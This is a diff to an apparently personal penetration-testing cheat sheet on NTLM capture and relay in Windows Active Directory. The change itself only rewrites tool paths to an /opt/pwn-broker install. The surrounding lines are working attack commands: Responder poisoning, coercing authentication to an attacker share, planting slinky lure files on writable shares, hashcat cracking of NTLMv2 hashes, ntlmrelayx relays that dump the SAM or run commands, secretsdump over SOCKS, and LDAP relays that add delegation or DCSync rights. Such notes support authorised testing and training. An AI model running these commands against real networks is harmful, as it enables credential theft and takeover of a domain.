@@ -13,12 +13,14 @@ sudo responder -I tun0
 - [ ] File inclusion on a Windows web server: ?<Param>=\\<LHOST>\share\x
 - [ ] SSRF, XXE or an upload that takes a path: \\<LHOST>\share or file://<LHOST>/share
 - [ ] A shell as another user: dir \\<LHOST>\share
+At the pwn-broker prompt: tool install netexec and tool install impacket.
 A lure on every share I can write, for whoever browses it:
 nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M slinky -o SERVER=<LHOST> NAME=important
 nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M slinky -o SERVER=<LHOST> NAME=important CLEANUP=True
 - [ ] The second line removes the lure afterwards
+- [ ] The full path for Impacket with sudo: sudo does not search pwn-broker's bin folder
 Just an SMB listener, with no poisoning:
-sudo impacket-smbserver share . -smb2support
+sudo /opt/pwn-broker/bin/impacket-smbserver share . -smb2support
 
 ## Crack it
 hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-<TargetIP>.txt /usr/share/wordlists/rockyou.txt
@@ -35,13 +37,13 @@ nxc smb <Subnet>/<CIDR> --gen-relay-list relay.txt
 ## Relay to SMB
 Responder's own SMB and HTTP servers off, so ntlmrelayx can take those ports:
 sudo sed -i 's/^SMB = On/SMB = Off/; s/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
-sudo impacket-ntlmrelayx -tf relay.txt -smb2support
+sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -tf relay.txt -smb2support
 sudo responder -I tun0
 - [ ] With no other option it dumps the SAM of each target it gets into
 A command instead of the SAM:
-sudo impacket-ntlmrelayx -tf relay.txt -smb2support -c 'whoami'
+sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -tf relay.txt -smb2support -c 'whoami'
 Every session kept open for my own tools, through proxychains:
-sudo impacket-ntlmrelayx -tf relay.txt -smb2support -socks
+sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -tf relay.txt -smb2support -socks
 proxychains -q impacket-secretsdump -no-pass '<Domain>/<TargetUser>@<TargetIP>'
 - [ ] The last line of /etc/proxychains4.conf is socks4 127.0.0.1 1080
 - [ ] socks, at the ntlmrelayx prompt, lists the sessions and whether each is an admin
@@ -49,8 +51,8 @@ proxychains -q impacket-secretsdump -no-pass '<Domain>/<TargetUser>@<TargetIP>'
 
 ## Relay to LDAP
 Signing on the DC's LDAP blocks a relay from SMB, but not one from HTTP, such as WebDAV.
-sudo impacket-ntlmrelayx -t ldaps://<DCIP> --delegate-access -smb2support
-sudo impacket-ntlmrelayx -t ldap://<DCIP> --escalate-user '<Username>' -smb2support
+sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -t ldaps://<DCIP> --delegate-access -smb2support
+sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -t ldap://<DCIP> --escalate-user '<Username>' -smb2support
 - [ ] A computer account caught with --delegate-access: a new machine with resource-based constrained delegation over it: :Pb delegation
 - [ ] --escalate-user gives my user DCSync when the caught account may change the domain's ACL
 - [ ] Relaying to the CA's web enrollment instead, ADCS ESC8: :Pb adcs
